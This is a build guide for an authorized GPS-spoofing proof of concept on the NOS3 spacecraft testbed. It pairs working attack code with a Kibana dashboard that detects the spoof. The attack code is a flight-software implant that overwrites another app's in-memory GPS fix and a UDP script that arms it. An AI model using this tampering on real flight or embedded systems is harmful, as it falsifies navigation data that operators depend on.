# GPS-spoof PoC: step-by-step build guide (noisy_app spin-write -> Kibana truth vs downlink)

This is a do-this-then-that guide. Each step says which file, where in it, and exactly
what to paste. It is an authorized test scenario on the DTU NOS3 testbed.

## What you will end up with

- `noisy_app` (already in the build) gains an ARM/DISARM command. When armed it runs a
  child task that spin-writes `NOVATEL_OEM615_AppData.DevicePkt.Novatel_oem615.lat/lon`
  (the NovAtel GPS app's in-memory fix). No Software Bus publish, no MM command: it is a
  pure cross-app memory write.
- `scripts/attack/attack_gps_spoof.py` arms/disarms it over the CI_LAB UDP bridge.
- The god_view passive listener decodes the downlinked NovAtel packet (MID 0x0871) into
  `nav_dl_lat`/`nav_dl_lon`.
- A new Kibana dashboard `nos3-gps-spoof` overlays the TRUE simulator latitude
  (`gps_lat`) against the DOWNLINKED latitude (`nav_dl_lat`) so the divergence is visible.

## Accuracy notes (read first)

- Confirmed field layout (`components/.../novatel_oem615_device.h:56-71`, cross-checked
  by `cfg/nos3_defs/tables/lc_def_wdt.c:156-165`): inside the published DEVICE_TLM packet,
  `lat` is at byte 78, `lon` at 82, `alt` at 86 (float32 each). ECEF doubles at 30/38/46.
- The sim emits BESTXYZA and GPGGA alternately (~1 Hz each). `ParseBestXYZA` zeroes lat/lon
  and fills ECEF; `ParseBestGPGGA` fills lat/lon. So unspoofed `nav_dl_lat` alternates
  real / 0 every tick - we flag the zeros with `nav_dl_valid` and filter them out.
- The Denmark SCIENCE-mode geofence (LC WP6) was deliberately moved to read `generic_gnss`,
  NOT NovAtel (`lc_def_wdt.c:207-213`). So spoofing NovAtel does NOT flip SCIENCE mode.
  NovAtel lat/lon still drives WP3 (altitude) and WP30-43 (US-region bounds). The PoC
  therefore demonstrates: (a) ground-vs-truth divergence in Kibana, and (b) tripping the
  US-region watchpoints. To also flip the Denmark SCIENCE geofence you would spoof
  `generic_gnss` instead - a parallel exercise, out of scope here.
- `NOISY_APP_CMD_MID` is already `0x18F2` (`noisy_app_msgids.h`); we reuse it.

---

# PART 1 - Flight software: arm + spin-write in noisy_app

## Step 1.1 - Replace `fsw/apps/noisy_app/fsw/src/noisy_app.c`

Open `nos3/fsw/apps/noisy_app/fsw/src/noisy_app.c` and replace the ENTIRE file with:

```c
/*
 * ============================================================================
 * NOISY_APP - GPS-spoof PoC (authorized test scenario)
 * ============================================================================
 * When armed by a ground command it runs a child task that repeatedly writes
 * the NovAtel GPS app's in-memory fix (NOVATEL_OEM615_AppData.DevicePkt) to a
 * spoofed latitude/longitude. This is a pure cross-app memory write: it never
 * publishes on the Software Bus.
 *
 * Commands (MID NOISY_APP_CMD_MID = 0x18F2):
 *   CC 10 (NOISY_APP_GPS_SPOOF_CC)  payload: Mode, ArgLat, ArgLon -> arm
 *   CC 11 (NOISY_APP_GPS_DISARM_CC) no payload                    -> disarm
 *   Mode 0 = hard set, 1 = bias add, 2 = drift accumulate (deg/sec).
 * ============================================================================
 */

#include "cfe.h"
#include "cfe_sb.h"
#include "cfe_es.h"
#include "cfe_evs.h"
#include "noisy_app_msgids.h"

/* The target app's real struct so the compiler computes the field offsets. */
#include "novatel_oem615_app.h"

#define NOISY_APP_GPS_SPOOF_CC   10
#define NOISY_APP_GPS_DISARM_CC  11

/* Command with spoof parameters. Packed so the byte layout matches the
 * attack script's struct.pack("<Bff", ...) payload exactly. */
typedef struct
{
    CFE_MSG_CommandHeader_t CmdHeader;
    uint8 Mode;    /* 0 hard, 1 bias, 2 drift */
    float ArgLat;  /* hard: target deg; bias: deg offset; drift: deg/sec */
    float ArgLon;
} __attribute__((packed)) NOISY_APP_GpsSpoof_cmd_t;

static volatile uint8  g_armed   = 0;
static volatile uint8  g_mode    = 0;
static volatile float  g_arg_lat = 0.0f;
static volatile float  g_arg_lon = 0.0f;
static NOVATEL_OEM615_AppData_t *g_nav = NULL;
static uint32 g_spoof_task_id = 0;

/* Spin-write loop. Priority just above the NAV child task (162); a short
 * delay keeps it from starving NAV entirely. Partial capture is expected:
 * NAV does parse->transmit with no yield, so only some downlinked packets
 * carry the spoof. Hard mode is the cleanest to see. */
void NOISY_SpoofTask(void)
{
    float drift_lat = 0.0f, drift_lon = 0.0f;
    while (g_armed && g_nav != NULL)
    {
        volatile float *plat = &g_nav->DevicePkt.Novatel_oem615.lat;
        volatile float *plon = &g_nav->DevicePkt.Novatel_oem615.lon;
        switch (g_mode)
        {
            case 1: /* bias */
                *plat = *plat + g_arg_lat;
                *plon = *plon + g_arg_lon;
                break;
            case 2: /* drift */
                drift_lat += g_arg_lat * 0.002f; /* per ~2 ms tick */
                drift_lon += g_arg_lon * 0.002f;
                *plat = *plat + drift_lat;
                *plon = *plon + drift_lon;
                break;
            default: /* hard */
                *plat = g_arg_lat;
                *plon = g_arg_lon;
                break;
        }
        OS_TaskDelay(2);
    }
    CFE_ES_ExitChildTask();
}

static void NOISY_HandleCommand(CFE_SB_Buffer_t *BufPtr)
{
    CFE_MSG_FcnCode_t cc = 0;
    size_t            len = 0;

    CFE_MSG_GetFcnCode(&BufPtr->Msg, &cc);
    CFE_MSG_GetSize(&BufPtr->Msg, &len);

    if (cc == NOISY_APP_GPS_SPOOF_CC)
    {
        if (len != sizeof(NOISY_APP_GpsSpoof_cmd_t))
        {
            CFE_EVS_SendEvent(20, CFE_EVS_EventType_ERROR,
                              "NOISY_APP: bad SPOOF cmd len %u (want %u)",
                              (unsigned)len, (unsigned)sizeof(NOISY_APP_GpsSpoof_cmd_t));
            return;
        }
        NOISY_APP_GpsSpoof_cmd_t *c = (NOISY_APP_GpsSpoof_cmd_t *)BufPtr;

        cpuaddr addr = 0;
        if (OS_SymbolLookup(&addr, "NOVATEL_OEM615_AppData") != OS_SUCCESS)
        {
            CFE_EVS_SendEvent(21, CFE_EVS_EventType_ERROR,
                              "NOISY_APP: OS_SymbolLookup(NOVATEL_OEM615_AppData) failed");
            return;
        }
        g_nav     = (NOVATEL_OEM615_AppData_t *)addr;
        g_mode    = c->Mode;
        g_arg_lat = c->ArgLat;
        g_arg_lon = c->ArgLon;

        if (!g_armed)
        {
            g_armed = 1;
            CFE_ES_CreateChildTask(&g_spoof_task_id, "NOISY_SPOOF",
                                   NOISY_SpoofTask, 0, 4096, 160, 0);
        }
        CFE_EVS_SendEvent(22, CFE_EVS_EventType_INFORMATION,
                          "NOISY_APP: GPS SPOOF ARMED mode=%u lat=%f lon=%f",
                          (unsigned)g_mode, (double)g_arg_lat, (double)g_arg_lon);
    }
    else if (cc == NOISY_APP_GPS_DISARM_CC)
    {
        g_armed = 0;
        CFE_EVS_SendEvent(23, CFE_EVS_EventType_INFORMATION,
                          "NOISY_APP: GPS SPOOF DISARMED");
    }
}

void NOISY_APP_Main(void)
{
    uint32           RunStatus = CFE_ES_RunStatus_APP_RUN;
    CFE_SB_PipeId_t  CmdPipe;
    CFE_SB_Buffer_t *BufPtr;

    CFE_EVS_Register(NULL, 0, CFE_EVS_EventFilter_BINARY);
    CFE_ES_WaitForStartupSync(10000);

    CFE_SB_CreatePipe(&CmdPipe, 10, "NOISY_CMD_PIPE");
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(NOISY_APP_CMD_MID), CmdPipe);

    CFE_EVS_SendEvent(1, CFE_EVS_EventType_INFORMATION,
                      "NOISY_APP: Initialized (GPS-spoof PoC). CMD MID 0x%04X.",
                      (unsigned int)NOISY_APP_CMD_MID);

    while (CFE_ES_RunLoop(&RunStatus) == true)
    {
        if (CFE_SB_ReceiveBuffer(&BufPtr, CmdPipe, CFE_SB_PEND_FOREVER) == CFE_SUCCESS
            && BufPtr != NULL)
        {
            NOISY_HandleCommand(BufPtr);
        }
    }

    CFE_ES_ExitApp(RunStatus);
}
```

## Step 1.2 - Edit `fsw/apps/noisy_app/CMakeLists.txt`

Replace the `target_include_directories(...)` block (lines 8-10) so the NovAtel headers
resolve. The file should read:

```cmake
cmake_minimum_required(VERSION 3.5)
project(CFS_NOISY_APP C)

set(APP_SRC_FILES
    fsw/src/noisy_app.c
)

add_cfe_app(noisy_app ${APP_SRC_FILES})

target_include_directories(noisy_app PUBLIC
    fsw/platform_inc
    ${CMAKE_CURRENT_SOURCE_DIR}/../../../components/novatel_oem615/fsw/cfs/src
    ${CMAKE_CURRENT_SOURCE_DIR}/../../../components/novatel_oem615/fsw/cfs/platform_inc
    ${CMAKE_CURRENT_SOURCE_DIR}/../../../components/novatel_oem615/fsw/cfs/mission_inc
    ${CMAKE_CURRENT_SOURCE_DIR}/../../../components/novatel_oem615/fsw/shared
    ${hwlib_MISSION_DIR}/fsw/public_inc
)
```

Likely build hiccup: if the compiler cannot find `hwlib.h`, the `${hwlib_MISSION_DIR}`
variable was not set for this app. Confirm the path
`components/../fsw/.../hwlib/fsw/public_inc` exists and hard-code it if necessary.
No change to `noisy_app_msgids.h` is required (we reuse `0x18F2`).

---

# PART 2 - Attack trigger script

## Step 2.1 - Create `scripts/attack/attack_gps_spoof.py`

Create a new file with this content (modeled on `attack_noisy_trigger.py`):

```python
#!/usr/bin/env python3
"""
attack_gps_spoof.py - arm/disarm the noisy_app GPS spoof of the NovAtel fix.

Sends a NOISY_APP command (MID 0x18F2) over the CI_LAB UDP bridge:
  --mode hard  : force lat/lon to --lat/--lon
  --mode bias  : add --lat/--lon as a fixed offset
  --mode drift : add --lat/--lon deg/sec, accumulating
  --disarm     : stop spoofing

Run it where scripts/god_view_capture.py runs (it prints the CI_LAB IP at
startup); pass that IP via --host if 127.0.0.1 does not reach the FSW.
"""
import argparse
import socket
import struct

NOISY_APP_CMD_MID       = 0x18F2
NOISY_APP_GPS_SPOOF_CC  = 10
NOISY_APP_GPS_DISARM_CC = 11
MODE = {"hard": 0, "bias": 1, "drift": 2}


def build_arm(mode: int, lat: float, lon: float) -> bytes:
    # payload: <Bff = Mode(1) + ArgLat(4) + ArgLon(4) = 9 bytes
    payload = struct.pack("<Bff", mode, lat, lon)
    total   = 6 + 2 + len(payload)          # primary(6)+sec(2)+payload
    hdr = struct.pack(">HHHBB",
                      NOISY_APP_CMD_MID,     # raw MID already has cmd+sechdr bits
                      0xC000,                # seq + cmd type flag
                      total - 7,             # CCSDS data_length
                      NOISY_APP_GPS_SPOOF_CC,
                      0x00)                  # checksum (not validated in sim)
    return hdr + payload


def build_disarm() -> bytes:
    # no payload: data_length = sec_hdr(2) + 0 - 1 = 1
    return struct.pack(">HHHBB", NOISY_APP_CMD_MID, 0xC000, 0x0001,
                       NOISY_APP_GPS_DISARM_CC, 0x00)


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=5012)  # CI_LAB_CMD_PORT (god_view)
    p.add_argument("--mode", choices=list(MODE), default="hard")
    p.add_argument("--lat", type=float, default=50.0)
    p.add_argument("--lon", type=float, default=5.0)
    p.add_argument("--disarm", action="store_true")
    args = p.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if args.disarm:
        pkt, note = build_disarm(), "disarm"
    else:
        pkt = build_arm(MODE[args.mode], args.lat, args.lon)
        note = f"{args.mode} lat={args.lat} lon={args.lon}"

    sock.sendto(pkt, (args.host, args.port))
    sock.close()
    print(f"[+] gps_spoof {note} -> {args.host}:{args.port}")


if __name__ == "__main__":
    main()
```

---

# PART 3 - Decode the downlinked NovAtel packet (passive listener)

The decode table lives in BOTH `scripts/god_view_capture.py` and
`scripts/passive_listener.py` (each has its own `_DECODE_BY_NAME`). Add the SAME entry to
both.

## Step 3.1 - `scripts/god_view_capture.py`

Find the line (in `_DECODE_BY_NAME`):

```python
    "NOVATEL_OEM615_HK_TLM_MID": ("GPS", [("cmd_count", 16, "B")]),
```

Immediately AFTER it, paste:

```python
    # PoC: decode the NovAtel DEVICE_TLM fix so the downlinked (possibly
    # spoofed) lat/lon is visible. Offsets verified vs the packed
    # Device_Data_tlm_t and lc_def_wdt.c (lat@78, lon@82, alt@86).
    "NOVATEL_OEM615_DEVICE_TLM_MID": ("NAV", [
        ("nav_dl_ecef_x", 30, "<d"),
        ("nav_dl_ecef_y", 38, "<d"),
        ("nav_dl_ecef_z", 46, "<d"),
        ("nav_dl_lat",    78, "<f"),
        ("nav_dl_lon",    82, "<f"),
        ("nav_dl_alt",    86, "<f"),
    ]),
```

## Step 3.2 - `scripts/passive_listener.py`

Find the same `"NOVATEL_OEM615_HK_TLM_MID": (...)` line in its `_DECODE_BY_NAME`
(around line 132+) and paste the identical block after it.

Note: NovAtel lat/lon are already decimal degrees (GPGGA parse converts NMEA->deg), so no
radians conversion is needed for `nav_dl_*` (unlike the sim-log `gps_lat`).

---

# PART 4 - ELK pipeline + Kibana dashboard

## Step 4.1 - `elk/index_template.json`

Find the line:

```json
        "gps_location":          { "type": "geo_point" },
```

Immediately AFTER it, paste:

```json
        "nav_dl_lat":            { "type": "double" },
        "nav_dl_lon":            { "type": "double" },
        "nav_dl_alt":            { "type": "double" },
        "nav_dl_ecef_x":         { "type": "double" },
        "nav_dl_ecef_y":         { "type": "double" },
        "nav_dl_ecef_z":         { "type": "double" },
        "nav_dl_valid":          { "type": "boolean" },
```

## Step 4.2 - `elk/logstash.conf`

The decoded fields arrive on the existing `tlm_hk_decoded.log` -> `type == "hk_decoded"`
path; no new input is needed. Inside the `if [type] == "hk_decoded" {` block, in the
`mutate { convert => { ... } }` list (the one that converts `gnss_lat` etc.), add these
lines alongside the others:

```
        "nav_dl_lat"          => "float"
        "nav_dl_lon"          => "float"
        "nav_dl_alt"          => "float"
```

Then, find the END of that same hk_decoded block - the `GENERIC_GNSS` /
`in_science_mode` sub-block that ends with:

```
    if [subsystem] == "GENERIC_GNSS" and [type] == "hk_decoded" {
      if [in_science_mode] == 1 {
        mutate { add_field => { "spacecraft_mode_name" => "SCIENCE" } }
      } else if [in_science_mode] == 0 {
        mutate { add_field => { "spacecraft_mode_name" => "NOT_SCIENCE" } }
      }
    }
```

Immediately AFTER that inner `}` (still inside the outer hk_decoded `if`), paste:

```
    # PoC: flag valid NovAtel downlink fixes. The sim alternates BESTXYZA
    # (lat/lon = 0) and GPGGA (lat/lon real), so drop the zero ticks for the
    # truth-vs-downlink comparison panels.
    if [app] == "NAV" and [type] == "hk_decoded" {
      if [nav_dl_lat] and [nav_dl_lon] and ([nav_dl_lat] != 0.0 or [nav_dl_lon] != 0.0) {
        mutate { add_field => { "nav_dl_valid" => "true" } }
      } else {
        mutate { add_field => { "nav_dl_valid" => "false" } }
      }
    }
```

(The cross-stream truth-vs-downlink comparison is done in Kibana, not here: `gps_lat`
lives on `system_log` GPS Data Point docs and `nav_dl_lat` on `hk_decoded` docs - two
different documents, so a per-event delta is not possible in Logstash.)

## Step 4.3 - `elk/build_kibana_dashboards.py`

(a) Add a builder. Just BEFORE the line `REGISTRY = [`, paste this function:

```python
def build_gps_spoof():
    panels = []
    panels.append(markdown_panel(
        "### NOS3 PoC: GPS spoof (NovAtel in-memory)\n"
        "**TRUE** sub-satellite latitude from the simulator (`gps_lat`) vs the "
        "**DOWNLINKED** NovAtel fix (`nav_dl_lat`) decoded off the TO_LAB stream. "
        "When `noisy_app` is armed the downlink diverges from truth while the orbit "
        "(truth) keeps sweeping. The spoof is a pure memory write, so no bus publish "
        "or subscribe is involved.",
        "About", 0, 0, 48, 6))

    m_true = metric_panel(
        "Current TRUE latitude (deg)",
        "Last gps_lat from the simulator log (ground truth).",
        col_last_value_num("gps_lat", "True lat"),
        query='gps_lat: *')
    panels.append(lens_panel(m_true, "True latitude", 0, 6, 24, 8))

    m_dl = metric_panel(
        "Current DOWNLINKED latitude (deg)",
        "Last nav_dl_lat decoded from the NovAtel DEVICE_TLM downlink (valid ticks only).",
        col_last_value_num("nav_dl_lat", "Downlinked lat"),
        query='nav_dl_valid: true')
    panels.append(lens_panel(m_dl, "Downlinked latitude", 24, 6, 24, 8))

    lat_cmp = line_panel(
        "Latitude: TRUE (sim) vs DOWNLINKED (NavAtel)",
        "Blue = simulator truth (gps_lat). Other = decoded downlink (nav_dl_lat). "
        "Divergence = active spoof.",
        [(col_avg("gps_lat", "True lat (sim)"), "True lat (sim)"),
         (col_avg("nav_dl_lat", "Downlinked lat"), "Downlinked lat")],
        query='gps_lat: * or nav_dl_valid: true',
        series_type="line")
    panels.append(lens_panel(lat_cmp, "Latitude truth vs downlink", 0, 14, 48, 14))

    lon_cmp = line_panel(
        "Longitude: TRUE (sim) vs DOWNLINKED (NavAtel)",
        "Blue = simulator truth (gps_lon). Other = decoded downlink (nav_dl_lon).",
        [(col_avg("gps_lon", "True lon (sim)"), "True lon (sim)"),
         (col_avg("nav_dl_lon", "Downlinked lon"), "Downlinked lon")],
        query='gps_lon: * or nav_dl_valid: true',
        series_type="line")
    panels.append(lens_panel(lon_cmp, "Longitude truth vs downlink", 0, 28, 48, 14))

    panelsJSON = json.dumps(panels, separators=(",", ":"))
    refs = collect_dashboard_refs(panels)
    attrs = {
        "title": "NOS3 PoC: GPS spoof (truth vs downlink)",
        "hits": 0,
        "description": "TRUE simulator GPS vs downlinked NovAtel fix; reveals the "
                       "noisy_app in-memory spoof.",
        "panelsJSON": panelsJSON,
        "optionsJSON": json.dumps({"useMargins": True, "syncColors": False, "hidePanelTitles": False}),
        "version": 1,
        "timeRestore": False,
        "kibanaSavedObjectMeta": {"searchSourceJSON": json.dumps({"query": {"query": "", "language": "kuery"}, "filter": []})},
    }
    return attrs, refs
```

(b) Register it. Inside the `REGISTRY = [` list, add this entry (e.g. right after the
`nos3-mission-denmark` entry):

```python
    ("nos3-gps-spoof",                  "dashboard", build_gps_spoof,
     "PoC: GPS spoof truth vs downlink"),
```

## Step 4.4 - `elk/refresh_index_pattern_fields.py`

In the `REQUIRED_NEW_FIELDS = {` set, add:

```python
    "nav_dl_lat", "nav_dl_lon", "nav_dl_valid",
```

---

# PART 5 - Build, run, trigger

From `nos3/`:

```bash
make config                         # regen build copies (noisy_app already listed)
make fsw                            # amd64
make launch                         # bring up the stack
cd elk && docker compose up -d && cd ..   # ELK if not already up
```

Restart the god_view capture so the new 0x0871 decode is loaded (however your launch flow
starts it; it logs `[god_view] Listening ...` and prints the CI_LAB IP - note that IP for
`--host`).

Push the dashboard + refresh fields:

```bash
python3 elk/build_kibana_dashboards.py --only nos3-gps-spoof
```

(That call uploads via the Saved Objects API and refreshes the data-view field cache.)

Trigger the spoof (use the CI_LAB IP god_view printed if 127.0.0.1 does not reach FSW):

```bash
# hard spoof to 50N 5E
python3 scripts/attack/attack_gps_spoof.py --mode hard --lat 50 --lon 5
# slow drift
python3 scripts/attack/attack_gps_spoof.py --mode drift --lat 0.02 --lon 0
# stop
python3 scripts/attack/attack_gps_spoof.py --disarm
```

---

# PART 6 - Verify in Kibana (http://localhost:5604)

1. Open dashboard "NOS3 PoC: GPS spoof (truth vs downlink)".
2. BEFORE arming: the two latitude series overlap (downlink tracks truth on GPGGA ticks).
   This validates the decode offsets/units. If `nav_dl_lat` is wildly off, re-check the
   Step 3 offsets against a fresh hex dump.
3. Arm hard 50/5: the downlink series flatlines near 50 while the true series keeps
   sweeping with the orbit. Clear divergence.
4. Drift: the downlink series pulls away from truth at a growing rate.
5. Disarm: the series reconverge.
6. Optional: query EVS for `NOISY_APP: GPS SPOOF ARMED` to timestamp the attack.

---

# Caveats

- Partial capture is expected (chosen tradeoff): NAV's parse->transmit has no yield, so
  only some downlinked packets carry the spoof; hard mode is the most visible. If too
  sparse, lower `OS_TaskDelay(2)` or raise the spoof-task priority (160 -> lower number).
- bias/drift interact with the BESTXYZA zeroing (base is 0 on those ticks); hard mode is
  unaffected. Filter panels on `nav_dl_valid: true`.
- Spoofing NovAtel does NOT move the Denmark SCIENCE geofence (that reads generic_gnss in
  this build). It does affect WP3 / WP30-43. Spoofing the Denmark flip is a separate
  generic_gnss exercise.
- Decode offsets are the single most error-prone part; the baseline overlap check (Step
  6.2) gates everything.
- Do not touch the load-bearing IPC-port edits (see docs/debug/sim-ipc-and-42-connectivity.md).
- The headline result: a pure cross-app memory write changes the downlinked position
  without any Software Bus publish or subscribe, so a bus-level access control never
  observes it. The detection is the truth-vs-downlink divergence in the dashboard above,
  not any bus event.
```
